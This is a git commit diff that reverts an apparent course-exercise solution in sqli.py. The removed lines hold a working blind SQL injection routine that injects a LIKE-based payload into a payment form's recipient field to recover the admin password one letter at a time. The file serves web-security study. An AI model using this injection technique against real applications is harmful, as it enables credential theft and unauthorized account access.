72d44c365c6730adeb6e4a38639b833950d7242d
Panda Xu <49774769+30PandaX@users.noreply.github.com>
2021-10-18 16:26:14 -0400

    Revert "part1"

--- sqli.py
+++ sqli.py
@@ -14,39 +14,17 @@ def submit_login_form(sess, username, password):
 
 def submit_pay_form(sess, recipient, amount):
     # You may need to include CSRF token from Exercise 1.5 in the POST request below 
-    # SELECT * FROM users WHERE users.username='{}' LIMIT 1 OFFSET 0
     response = sess.post(PAY_FORM_URL,
                     data={
                         "recipient": recipient,
                         "amount": amount,
-                        "csrf-token": sess.cookies.get_dict()['session'],
-
                     })
     return response.status_code == codes.ok
 
 def sqli_attack(username):
     sess = Session()
     assert(submit_login_form(sess, "attacker", "attacker"))
-    print(sess.cookies.get_dict())
-    print("sess id:"+str(sess.cookies.get_dict()['session']))
-
-    pwd = ''
-    i = 0
-    '''
-    i is also the fail count of trying each position in the pwd
-    when i == 26, it means the pwd length can no longer increase
-    hence, we should break out the while loop
-    Construct pwd
-    '''
-    while i < 26:
-        if submit_pay_form(sess, username + "' and users.password LIKE '" + pwd + chr(ord('a')+i) + "%' LIMIT 1 OFFSET 0--", 0):
-            pwd += chr(ord('a') + i)
-            # reset i
-            i = 0    
-        else:           
-            i += 1
-    print(pwd)
-    return pwd
+    pass
 
 def main():
     sqli_attack("admin")
